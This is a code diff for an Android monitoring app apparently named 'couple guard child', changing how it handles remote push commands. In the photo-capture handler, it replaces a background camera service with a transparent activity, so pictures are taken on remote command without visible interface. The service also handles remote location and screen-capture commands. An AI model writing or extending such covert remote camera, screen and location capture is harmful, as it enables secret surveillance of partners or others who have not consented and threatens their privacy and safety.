@@ -13,6 +13,7 @@ import com.example.couple_guard_child.utils.ApiClient
 import kotlinx.coroutines.tasks.await
 import com.example.couple_guard_child.services.ScreenCaptureBackgroundService
 import com.example.couple_guard_child.services.CameraBackgroundService
+import com.example.couple_guard_child.services.CameraTransparentActivity
 
 class MyFirebaseMessagingService : FirebaseMessagingService() {
 
@@ -58,14 +59,15 @@ class MyFirebaseMessagingService : FirebaseMessagingService() {
                 requestLocationUpdate()
             }
             "CAPTURE_PHOTO" -> {
-                Log.d(TAG, "📸 Executing: Capture Photo (Background)")
+                Log.d(TAG, "📸 Executing: Capture Photo")
                 val useFront = data["front_camera"]?.toBoolean() ?: true
                 
                 try {
-                    CameraBackgroundService.startCapture(applicationContext, useFront)
-                    Log.d(TAG, "✅ Background camera service started")
+                    // ✅ Use transparent activity instead of background service
+                    CameraTransparentActivity.start(applicationContext, useFront)
+                    Log.d(TAG, "✅ Camera activity started")
                 } catch (e: Exception) {
-                    Log.e(TAG, "❌ Failed to start camera service", e)
+                    Log.e(TAG, "❌ Failed to start camera activity", e)
                 }
             }
             "SCREEN_CAPTURE" -> {
